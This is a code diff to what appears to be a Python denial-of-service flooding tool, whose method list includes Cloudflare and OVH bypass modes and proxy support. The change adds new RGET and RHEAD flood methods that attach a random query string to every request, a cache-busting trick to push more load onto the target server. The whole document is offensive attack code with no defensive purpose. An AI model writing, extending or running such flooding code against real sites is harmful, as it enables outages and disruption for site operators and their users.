@@ -46,8 +46,8 @@ ctx.set_ciphers("DEFAULT")
 
 class Methods:
     HTTP_METHODS: Set[str] = {
-        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
-        "NULL", "COOKIE", "PPS", "EVEN", "AVB",
+        "CFB", "BYPASS", "GET", "RGET", "HEAD", "RHEAD", "POST", "STRESS", "DYN", "SLOW",
+        "NULL", "COOKIE", "PPS", "EVEN", "AVB", "OVH",
         "APACHE", "XMLRPC", "DOWNLOADER", "RHEX", "STOMP"
     }
     TCP_METHODS: Set[str] = {"TCP"}
@@ -186,7 +186,7 @@ class AsyncTcpFlood:
         self._proxies = proxies
         self._req_type = (
             "POST" if method.upper() in {"POST", "XMLRPC", "STRESS"}
-            else "HEAD" if method.upper() in {"HEAD"}
+            else "HEAD" if method.upper() in {"HEAD", "RHEAD"}
             else "GET"
         )
 
@@ -224,8 +224,11 @@ class AsyncTcpFlood:
             + self.random_headers()
         )
 
-    def default_path_qs(self) -> str:
-        path_qs = self._target.raw_path_qs
+    @property
+    def default_path_qs(self):
+        return self._target.raw_path_qs
+
+    def add_rand_query(self, path_qs) -> str:
         if self._target.raw_query_string:
             path_qs += '&%s=%s' % (Tools.rand_str(6), Tools.rand_str(6))
         else:
@@ -233,7 +236,7 @@ class AsyncTcpFlood:
         return path_qs
 
     def build_request(self, path_qs=None, headers=None, body=None) -> bytes:
-        path_qs = path_qs or self.default_path_qs()
+        path_qs = path_qs or self.default_path_qs
         headers = headers or self.default_headers()
         request = (
             f"{self._req_type} {path_qs} HTTP/1.1\r\n"
@@ -326,7 +329,14 @@ class AsyncTcpFlood:
         payload: bytes = self.build_request()
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
+    async def RGET(self, on_connect=None) -> bool:
+        payload: bytes = self.build_request(
+            path_qs=self.add_rand_query(self.default_path_qs)
+        )
+        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
+
     HEAD = GET
+    RHEAD = RGET
 
     async def POST(self, on_connect=None) -> bool:
         payload: bytes = self.build_request(
